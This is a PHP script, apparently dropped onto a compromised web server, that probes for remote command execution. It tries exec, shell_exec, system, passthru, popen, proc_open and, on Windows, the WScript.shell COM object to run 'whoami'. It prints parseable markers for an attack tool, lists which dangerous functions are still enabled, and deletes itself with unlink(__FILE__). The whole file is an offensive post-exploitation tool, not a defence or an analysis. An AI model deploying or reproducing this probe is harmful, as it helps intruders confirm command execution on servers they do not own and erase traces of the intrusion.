<?php
//  所有disable functions函数
// 	exec,system,passthru,shell_exec,escapeshellarg,escapeshellcmd,proc_close,proc_open,ini_alter,dl,popen,pcntl_exec,socket_accept,socket_bind,socket_clear_error,socket_close,socket_connect,socket_create_listen,socket_create_pair,socket_create,socket_get_option,socket_getpeername,socket_getsockname,socket_last_error,socket_listen,socket_read,socket_recv,socket_recvfrom,socket_select,socket_send,socket_sendto,socket_set_block,socket_set_nonblock,socket_set_option,socket_shutdown,socket_strerror,socket_write,stream_socket_client,stream_socket_server,pfsockopen,disk_total_space,disk_free_space,diskfreespace,get_current_user,getmyuid,getmypid,dl,leak,listen,chgrp,link,symlink,dlopen,proc_nice,proc_get_stats,proc_terminate,shell_exec,sh2_exec,posix_getpwuid,posix_getgrgid,posix_kill,ini_restore,mkfifo,dbmopen,dbase_open,filepro,filepro_rowcount,posix_mkfifo,putenv,sleep,chmod,chown,php_uname,mail
if(function_exists('exec')){
    echo 'YouExistRCE';
    echo 'MeThOdexecMeThOd';
    echo exec('whoami');
}else if(function_exists('shell_exec')){
    echo 'YouExistRCE';
    echo 'MeThOdshell_execMeThOd';
    echo shell_exec('whoami');
}else if(function_exists('system')){
    echo 'YouExistRCE';
    echo 'MeThOdsystemMeThOd';
    system('whoami');
}else if(function_exists('passthru')){
    echo 'YouExistRCE';
    echo 'MeThOdpassthruMeThOd';
    passthru("whoami");
}else if(function_exists('popen')){
    echo 'YouExistRCE';
    echo 'MeThOdpopenMeThOd';
    echo fgets(popen('whoami',"r"), 1024);
}else if(function_exists('proc_open')){
    echo 'YouExistRCE';
    echo 'MeThOdproc_openMeThOd';
    $handle = proc_open('whoami' ,array(1 => array("pipe", "w")), $pipes);
    echo fgets($pipes[1], 1024); //fgets($pipes[1],1024);
}else if(function_exists('phpinfo')){
    echo 'sensitiveInfomation';
}else{
    $funcs = 'escapeshellarg,escapeshellcmd,proc_close,ini_alter,dl,socket_accept,socket_bind,socket_clear_error,socket_close,socket_connect,socket_create_listen,socket_create_pair,socket_create,socket_get_option,socket_getpeername,socket_getsockname,socket_last_error,socket_listen,socket_read,socket_recv,socket_recvfrom,socket_select,socket_send,socket_sendto,socket_set_block,socket_set_nonblock,socket_set_option,socket_shutdown,socket_strerror,socket_write,stream_socket_client,stream_socket_server,pfsockopen,disk_total_space,disk_free_space,diskfreespace,get_current_user,getmyuid,getmypid,dl,leak,listen,chgrp,link,symlink,dlopen,proc_nice,proc_get_stats,proc_terminate,shell_exec,sh2_exec,posix_getpwuid,posix_getgrgid,posix_kill,ini_restore,mkfifo,dbmopen,dbase_open,filepro,filepro_rowcount,posix_mkfifo,putenv,sleep,chmod,chown,php_uname,mail';
    $func = explode(',', $funcs);
    array_walk($func, function ($item){
        if(function_exists($item)){
            echo 'DangerFunc';
            echo 'MeThOd'.$item.'MeThOd';
        }
    });
}
if(strtoupper(substr(PHP_OS,0,3))==='WIN'){
    // 未禁用COM组件
    try{
        echo 'YouExistRCE';
        $wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
        $exec = $wsh->exec("cmd /c".'whoami'); //调用对象方法来执行命令
        $stdout = $exec->StdOut();
        $stroutput = $stdout->ReadAll();
        echo $stroutput;
    }catch (Exception $e){
    }
}else if(PATH_SEPARATOR==':'){
    if(function_exists('pcntl_exec')){
        echo 'YouExistRCE';
        echo 'MeThOdpcntl_execMeThOd';
    }
}
unlink(__FILE__);
?>
